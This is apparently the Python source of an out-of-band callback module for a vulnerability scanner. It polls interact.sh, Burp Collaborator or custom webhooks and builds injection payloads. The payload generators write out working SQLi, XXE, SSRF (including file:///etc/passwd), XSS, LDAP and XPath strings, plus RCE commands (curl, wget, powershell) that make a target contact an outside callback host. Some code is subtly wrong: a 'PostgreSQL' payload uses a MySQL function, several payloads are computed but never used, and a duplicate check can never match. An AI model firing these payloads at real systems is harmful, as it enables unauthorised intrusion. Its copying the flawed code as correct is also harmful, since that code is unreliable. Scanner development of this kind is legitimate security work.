"""
Out-of-Band (OOB) Callback Detection System for SentinelForge

This module provides safe, non-persistent callback detection for security vulnerabilities
(SQLi, XXE, SSRF, RCE, XSS) without maintaining persistent listeners. Instead, it generates
unique interaction identifiers and polls external callback services to detect OOB interactions.

Author: SentinelForge
License: Apache 2.0
"""

import abc
import hashlib
import logging
import random
import string
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple

import requests


logger = logging.getLogger(__name__)


class InteractionType(Enum):
    """Types of OOB interactions that can be detected."""
    DNS = "dns"
    HTTP = "http"
    SMTP = "smtp"
    HTTPS = "https"
    FTP = "ftp"
    UNKNOWN = "unknown"


class VulnerabilityClass(Enum):
    """Vulnerability classes that support OOB detection."""
    SQLi = "sqli"
    XXE = "xxe"
    SSRF = "ssrf"
    RCE = "rce"
    XSS = "xss"
    LDAP = "ldap"
    XPATH = "xpath"


@dataclass
class OOBEvidence:
    """Represents captured evidence of an OOB interaction."""
    interaction_type: InteractionType
    source_ip: str
    timestamp: datetime
    raw_data: Dict[str, Any]
    payload_id: str
    correlation_id: str
    interaction_id: str
    domain: str
    metadata: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        """Convert evidence to dictionary representation."""
        return {
            "interaction_type": self.interaction_type.value,
            "source_ip": self.source_ip,
            "timestamp": self.timestamp.isoformat(),
            "raw_data": self.raw_data,
            "payload_id": self.payload_id,
            "correlation_id": self.correlation_id,
            "interaction_id": self.interaction_id,
            "domain": self.domain,
            "metadata": self.metadata,
        }


class OOBProvider(abc.ABC):
    """Abstract base class for OOB callback service providers."""

    def __init__(self, base_domain: str, timeout_s: float = 30.0):
        """
        Initialize OOB provider.

        Args:
            base_domain: Base domain for generating interaction identifiers
            timeout_s: Timeout for API requests in seconds
        """
        self.base_domain = base_domain
        self.timeout_s = timeout_s

    @abc.abstractmethod
    def get_interactions(self) -> List[Dict[str, Any]]:
        """
        Fetch recorded interactions from the callback service.

        Returns:
            List of interaction dictionaries with keys: interaction_id, type, source_ip, timestamp, raw_data

        Raises:
            ConnectionError: If unable to connect to callback service
            ValueError: If response format is invalid
        """
        pass

    @abc.abstractmethod
    def verify_connectivity(self) -> bool:
        """
        Verify that the callback service is accessible.

        Returns:
            True if service is reachable, False otherwise
        """
        pass

    def generate_interaction_id(self) -> str:
        """
        Generate a unique interaction identifier.

        Returns:
            Unique interaction ID string
        """
        return "".join(random.choices(string.ascii_lowercase + string.digits, k=16))


class InteractshProvider(OOBProvider):
    """Provider for interact.sh-compatible callback services."""

    def __init__(
        self,
        base_domain: str,
        api_url: str = "https://interactsh.com",
        timeout_s: float = 30.0,
    ):
        """
        Initialize interact.sh provider.

        Args:
            base_domain: Base domain for generating interaction identifiers
            api_url: Base URL of the interact.sh API instance
            timeout_s: Timeout for API requests in seconds
        """
        super().__init__(base_domain, timeout_s)
        self.api_url = api_url.rstrip("/")
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "SentinelForge/1.0",
        })

    def verify_connectivity(self) -> bool:
        """Verify connectivity to interact.sh service."""
        try:
            response = self.session.get(
                f"{self.api_url}/register",
                timeout=self.timeout_s,
            )
            return response.status_code in (200, 400)
        except requests.RequestException as e:
            logger.warning(f"Interact.sh connectivity check failed: {e}")
            return False

    def get_interactions(self) -> List[Dict[str, Any]]:
        """
        Fetch interactions from interact.sh service.

        Returns:
            List of interaction records
        """
        if not self.base_domain:
            raise ValueError("base_domain is required for interact.sh provider")

        try:
            response = self.session.get(
                f"{self.api_url}/log",
                params={"url": self.base_domain},
                timeout=self.timeout_s,
            )
            response.raise_for_status()
            data = response.json()

            interactions = []
            for entry in data.get("interactions", []):
                interaction = {
                    "interaction_id": entry.get("url_part", ""),
                    "type": self._parse_interaction_type(entry.get("type", "")),
                    "source_ip": entry.get("source_ip", "unknown"),
                    "timestamp": self._parse_timestamp(entry.get("timestamp", "")),
                    "raw_data": entry,
                }
                interactions.append(interaction)

            return interactions
        except requests.RequestException as e:
            logger.error(f"Failed to fetch interactions from interact.sh: {e}")
            raise ConnectionError(f"interact.sh API error: {e}")
        except (KeyError, ValueError) as e:
            logger.error(f"Invalid interact.sh response format: {e}")
            raise ValueError(f"Invalid interact.sh response: {e}")

    @staticmethod
    def _parse_interaction_type(interaction_str: str) -> InteractionType:
        """Parse interaction type from service response."""
        type_map = {
            "dns": InteractionType.DNS,
            "http": InteractionType.HTTP,
            "https": InteractionType.HTTPS,
            "ftp": InteractionType.FTP,
            "smtp": InteractionType.SMTP,
        }
        return type_map.get(interaction_str.lower(), InteractionType.UNKNOWN)

    @staticmethod
    def _parse_timestamp(timestamp_str: str) -> datetime:
        """Parse timestamp from service response."""
        try:
            return datetime.fromisoformat(timestamp_str.replace("Z", "+00:00"))
        except (ValueError, AttributeError):
            return datetime.utcnow()


class BurpCollaboratorProvider(OOBProvider):
    """Provider for Burp Collaborator callback service."""

    def __init__(
        self,
        base_domain: str,
        api_key: str,
        api_url: str = "https://api.burpcollaborator.net",
        timeout_s: float = 30.0,
    ):
        """
        Initialize Burp Collaborator provider.

        Args:
            base_domain: Base domain for generating interaction identifiers
            api_key: Burp Collaborator API key
            api_url: Base URL of the Burp Collaborator API
            timeout_s: Timeout for API requests in seconds
        """
        super().__init__(base_domain, timeout_s)
        self.api_key = api_key
        self.api_url = api_url.rstrip("/")
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "SentinelForge/1.0",
        })

    def verify_connectivity(self) -> bool:
        """Verify connectivity to Burp Collaborator service."""
        try:
            response = self.session.get(
                f"{self.api_url}/interact",
                params={"apikey": self.api_key},
                timeout=self.timeout_s,
            )
            return response.status_code in (200, 400)
        except requests.RequestException as e:
            logger.warning(f"Burp Collaborator connectivity check failed: {e}")
            return False

    def get_interactions(self) -> List[Dict[str, Any]]:
        """
        Fetch interactions from Burp Collaborator service.

        Returns:
            List of interaction records
        """
        if not self.base_domain:
            raise ValueError("base_domain is required for Burp Collaborator")

        try:
            response = self.session.get(
                f"{self.api_url}/interact",
                params={
                    "apikey": self.api_key,
                    "domain": self.base_domain,
                },
                timeout=self.timeout_s,
            )
            response.raise_for_status()
            data = response.json()

            interactions = []
            for entry in data.get("interactions", []):
                interaction = {
                    "interaction_id": entry.get("interaction_id", ""),
                    "type": self._parse_interaction_type(entry.get("type", "")),
                    "source_ip": entry.get("client_ip", "unknown"),
                    "timestamp": datetime.fromtimestamp(entry.get("time_stamp", 0) / 1000),
                    "raw_data": entry,
                }
                interactions.append(interaction)

            return interactions
        except requests.RequestException as e:
            logger.error(f"Failed to fetch interactions from Burp Collaborator: {e}")
            raise ConnectionError(f"Burp Collaborator API error: {e}")
        except (KeyError, ValueError) as e:
            logger.error(f"Invalid Burp Collaborator response format: {e}")
            raise ValueError(f"Invalid response format: {e}")

    @staticmethod
    def _parse_interaction_type(interaction_str: str) -> InteractionType:
        """Parse interaction type from service response."""
        type_map = {
            "dns": InteractionType.DNS,
            "http": InteractionType.HTTP,
            "https": InteractionType.HTTPS,
        }
        return type_map.get(interaction_str.lower(), InteractionType.UNKNOWN)


class CustomWebhookProvider(OOBProvider):
    """Provider for custom webhook callback endpoints."""

    def __init__(
        self,
        base_domain: str,
        webhook_url: str,
        auth_header: Optional[str] = None,
        timeout_s: float = 30.0,
    ):
        """
        Initialize custom webhook provider.

        Args:
            base_domain: Base domain for generating interaction identifiers
            webhook_url: URL to fetch interactions from
            auth_header: Optional authorization header value
            timeout_s: Timeout for API requests in seconds
        """
        super().__init__(base_domain, timeout_s)
        self.webhook_url = webhook_url
        self.auth_header = auth_header
        self.session = requests.Session()
        if auth_header:
            self.session.headers.update({"Authorization": auth_header})
        self.session.headers.update({"User-Agent": "SentinelForge/1.0"})

    def verify_connectivity(self) -> bool:
        """Verify connectivity to webhook endpoint."""
        try:
            response = self.session.get(self.webhook_url, timeout=self.timeout_s)
            return response.status_code < 500
        except requests.RequestException as e:
            logger.warning(f"Webhook connectivity check failed: {e}")
            return False

    def get_interactions(self) -> List[Dict[str, Any]]:
        """
        Fetch interactions from custom webhook endpoint.

        Expected response format:
        {
            "interactions": [
                {
                    "interaction_id": "...",
                    "type": "dns|http|smtp|...",
                    "source_ip": "...",
                    "timestamp": "2024-01-01T00:00:00Z",
                    "raw_data": {...}
                }
            ]
        }

        Returns:
            List of interaction records
        """
        try:
            response = self.session.get(self.webhook_url, timeout=self.timeout_s)
            response.raise_for_status()
            data = response.json()

            interactions = []
            for entry in data.get("interactions", []):
                interaction = {
                    "interaction_id": entry.get("interaction_id", ""),
                    "type": self._parse_interaction_type(entry.get("type", "")),
                    "source_ip": entry.get("source_ip", "unknown"),
                    "timestamp": self._parse_timestamp(entry.get("timestamp", "")),
                    "raw_data": entry,
                }
                interactions.append(interaction)

            return interactions
        except requests.RequestException as e:
            logger.error(f"Failed to fetch interactions from webhook: {e}")
            raise ConnectionError(f"Webhook error: {e}")
        except (KeyError, ValueError) as e:
            logger.error(f"Invalid webhook response format: {e}")
            raise ValueError(f"Invalid webhook response: {e}")

    @staticmethod
    def _parse_interaction_type(interaction_str: str) -> InteractionType:
        """Parse interaction type from response."""
        type_map = {
            "dns": InteractionType.DNS,
            "http": InteractionType.HTTP,
            "https": InteractionType.HTTPS,
            "smtp": InteractionType.SMTP,
            "ftp": InteractionType.FTP,
        }
        return type_map.get(interaction_str.lower(), InteractionType.UNKNOWN)

    @staticmethod
    def _parse_timestamp(timestamp_str: str) -> datetime:
        """Parse timestamp from response."""
        try:
            return datetime.fromisoformat(timestamp_str.replace("Z", "+00:00"))
        except (ValueError, AttributeError):
            return datetime.utcnow()


class OOBManager:
    """
    Manages OOB interaction detection and payload correlation.

    Coordinates interaction ID generation, payload registration, interaction polling,
    and evidence correlation.
    """

    def __init__(self, provider: OOBProvider):
        """
        Initialize OOB manager.

        Args:
            provider: OOBProvider instance for callback detection
        """
        self.provider = provider
        self.payload_registry: Dict[str, Dict[str, Any]] = {}
        self.interaction_mapping: Dict[str, str] = {}  # interaction_id -> payload_id
        self.evidence_cache: Dict[str, List[OOBEvidence]] = {}
        logger.info(f"OOBManager initialized with provider: {provider.__class__.__name__}")

    def generate_interaction_id(self, payload_id: str) -> str:
        """
        Generate a unique interaction ID for a payload.

        Args:
            payload_id: Identifier for the payload that will trigger the interaction

        Returns:
            Unique interaction ID (subdomain for DNS/HTTP callbacks)
        """
        interaction_id = self.provider.generate_interaction_id()
        self.interaction_mapping[interaction_id] = payload_id
        logger.debug(f"Generated interaction ID: {interaction_id} for payload: {payload_id}")
        return interaction_id

    def register_payload(
        self,
        payload_id: str,
        interaction_id: str,
        metadata: Optional[Dict[str, Any]] = None,
    ) -> None:
        """
        Register a payload and its associated interaction ID.

        Args:
            payload_id: Unique identifier for the payload
            interaction_id: Interaction ID that will be triggered by the payload
            metadata: Optional metadata about the payload (injection point, parameter, etc.)
        """
        if payload_id in self.payload_registry:
            logger.warning(f"Payload {payload_id} already registered, overwriting")

        self.payload_registry[payload_id] = {
            "interaction_id": interaction_id,
            "timestamp_registered": datetime.utcnow(),
            "metadata": metadata or {},
        }
        logger.debug(f"Registered payload: {payload_id}")

    def poll_interactions(
        self,
        timeout_s: float = 30.0,
        interval_s: float = 2.0,
    ) -> List[OOBEvidence]:
        """
        Poll the callback provider for interactions.

        Args:
            timeout_s: Maximum time to wait for interactions in seconds
            interval_s: Time between polling attempts in seconds

        Returns:
            List of OOBEvidence objects representing detected interactions
        """
        start_time = time.time()
        all_evidence = []

        while time.time() - start_time < timeout_s:
            try:
                interactions = self.provider.get_interactions()
                logger.debug(f"Retrieved {len(interactions)} interactions from provider")

                for interaction in interactions:
                    interaction_id = interaction.get("interaction_id", "")
                    payload_id = self.interaction_mapping.get(interaction_id, "unknown")

                    # Skip interactions not from our registered payloads
                    if payload_id == "unknown" and interaction_id:
                        continue

                    evidence = OOBEvidence(
                        interaction_type=interaction.get("type", InteractionType.UNKNOWN),
                        source_ip=interaction.get("source_ip", "unknown"),
                        timestamp=interaction.get("timestamp", datetime.utcnow()),
                        raw_data=interaction.get("raw_data", {}),
                        payload_id=payload_id,
                        correlation_id=str(uuid.uuid4()),
                        interaction_id=interaction_id,
                        domain=self.provider.base_domain,
                    )

                    # Cache evidence and avoid duplicates
                    if evidence.correlation_id not in [e.correlation_id for e in all_evidence]:
                        all_evidence.append(evidence)
                        if payload_id not in self.evidence_cache:
                            self.evidence_cache[payload_id] = []
                        self.evidence_cache[payload_id].append(evidence)
                        logger.info(
                            f"Captured OOB evidence: {evidence.interaction_type.value} "
                            f"from {evidence.source_ip} for payload {payload_id}"
                        )

            except (ConnectionError, ValueError) as e:
                logger.warning(f"Error during interaction polling: {e}")

            if all_evidence:
                break

            time.sleep(interval_s)

        return all_evidence

    def get_evidence_for_payload(self, payload_id: str) -> List[OOBEvidence]:
        """
        Retrieve all captured evidence for a specific payload.

        Args:
            payload_id: Identifier of the payload

        Returns:
            List of OOBEvidence objects for the payload
        """
        return self.evidence_cache.get(payload_id, [])

    def create_oob_payload(
        self,
        vuln_class: VulnerabilityClass,
        interaction_id: str,
        base_domain: str,
    ) -> str:
        """
        Generate an OOB payload for a specific vulnerability class.

        Args:
            vuln_class: Type of vulnerability (SQLi, XXE, SSRF, RCE, XSS)
            interaction_id: Unique interaction ID to embed in the payload
            base_domain: Base domain for callback service

        Returns:
            Payload string ready for injection

        Raises:
            ValueError: If vulnerability class is not supported
        """
        subdomain = f"{interaction_id}.{base_domain}"

        payload_map = {
            VulnerabilityClass.SQLi: self._generate_sqli_payload(subdomain),
            VulnerabilityClass.XXE: self._generate_xxe_payload(subdomain),
            VulnerabilityClass.SSRF: self._generate_ssrf_payload(subdomain),
            VulnerabilityClass.RCE: self._generate_rce_payload(subdomain),
            VulnerabilityClass.XSS: self._generate_xss_payload(subdomain),
            VulnerabilityClass.LDAP: self._generate_ldap_payload(subdomain),
            VulnerabilityClass.XPATH: self._generate_xpath_payload(subdomain),
        }

        if vuln_class not in payload_map:
            raise ValueError(f"Unsupported vulnerability class: {vuln_class}")

        return payload_map[vuln_class]

    @staticmethod
    def _generate_sqli_payload(subdomain: str) -> str:
        """Generate SQLi OOB payload (multi-database compatible)."""
        # MySQL/MariaDB
        mysql_payload = f"LOAD_FILE('\\\\\\\\{subdomain}\\\\a')"
        # MSSQL
        mssql_payload = f"EXEC xp_dirtree '\\\\\\\\{subdomain}\\\\a'"
        # PostgreSQL (DNS-based)
        postgres_payload = f"SELECT version(); SELECT * FROM LOAD_FILE('\\\\\\\\{subdomain}\\\\a');"
        # Oracle (DNS-based)
        oracle_payload = f"SELECT UTL_HTTP.REQUEST('http://{subdomain}/') FROM DUAL;"

        # Return a multi-database payload
        return f"' UNION SELECT NULL WHERE EXISTS(SELECT 1 FROM(SELECT LOAD_FILE('\\\\\\\\{subdomain}\\\\a'))a)--"

    @staticmethod
    def _generate_xxe_payload(subdomain: str) -> str:
        """Generate XXE OOB payload."""
        return (
            "<?xml version=\"1.0\"?>"
            "<!DOCTYPE foo ["
            f"<!ENTITY xxe SYSTEM \"http://{subdomain}\">"
            "]>"
            "<foo>&xxe;</foo>"
        )

    @staticmethod
    def _generate_ssrf_payload(subdomain: str) -> str:
        """Generate SSRF OOB payload."""
        payloads = [
            f"http://{subdomain}/ssrf-check",
            f"https://{subdomain}/ssrf-check",
            f"gopher://{subdomain}/",
            f"file:///etc/passwd",  # Not OOB, but useful
        ]
        return payloads[0]  # Default to HTTP

    @staticmethod
    def _generate_rce_payload(subdomain: str) -> str:
        """Generate RCE OOB payload."""
        payloads = [
            f"curl http://{subdomain}/rce-check",
            f"wget http://{subdomain}/rce-check",
            f"nslookup {subdomain}",
            f"ping -c 1 {subdomain}",
            f"powershell -c \"Invoke-WebRequest http://{subdomain}\"",
        ]
        return payloads[0]  # Default to curl

    @staticmethod
    def _generate_xss_payload(subdomain: str) -> str:
        """Generate XSS OOB payload."""
        return f'<img src="http://{subdomain}/xss-check" onerror="fetch(this.src)">'

    @staticmethod
    def _generate_ldap_payload(subdomain: str) -> str:
        """Generate LDAP OOB payload."""
        return f"*)(|(mail=*{subdomain}"

    @staticmethod
    def _generate_xpath_payload(subdomain: str) -> str:
        """Generate XPath OOB payload."""
        return f"' or document('http://{subdomain}') or '1'='1"

    def clear_cache(self) -> None:
        """Clear all cached evidence and interaction mappings."""
        self.evidence_cache.clear()
        self.interaction_mapping.clear()
        self.payload_registry.clear()
        logger.info("OOBManager cache cleared")


__all__ = [
    "InteractionType",
    "VulnerabilityClass",
    "OOBEvidence",
    "OOBProvider",
    "InteractshProvider",
    "BurpCollaboratorProvider",
    "CustomWebhookProvider",
    "OOBManager",
]
